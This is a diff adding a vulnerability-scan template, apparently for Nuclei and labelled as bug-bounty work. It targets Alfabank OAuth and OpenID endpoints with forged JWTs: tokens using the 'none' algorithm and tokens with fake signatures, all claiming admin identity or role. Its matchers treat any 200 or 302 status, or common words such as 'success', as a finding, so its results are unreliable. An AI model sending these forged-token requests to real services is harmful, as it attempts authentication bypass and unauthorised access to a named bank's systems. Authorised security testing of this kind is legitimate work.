@@ -1,0 +1,39 @@
+id: alfabank-jwt-vulnerabilities
+
+info:
+  name: Alfabank - JWT Token Manipulation
+  author: bugbounty
+  severity: high
+  description: JWT vulnerabilities - none algorithm, weak signature
+  tags: jwt,auth,alfabank
+
+http:
+  - raw:
+      - |
+        GET /gate/oauth/callback HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
+
+      - |
+        GET /openid/authorize/newclick-web HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.test
+
+      - |
+        GET /passport/openid-blue/authorize HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "authorized"
+          - "success"
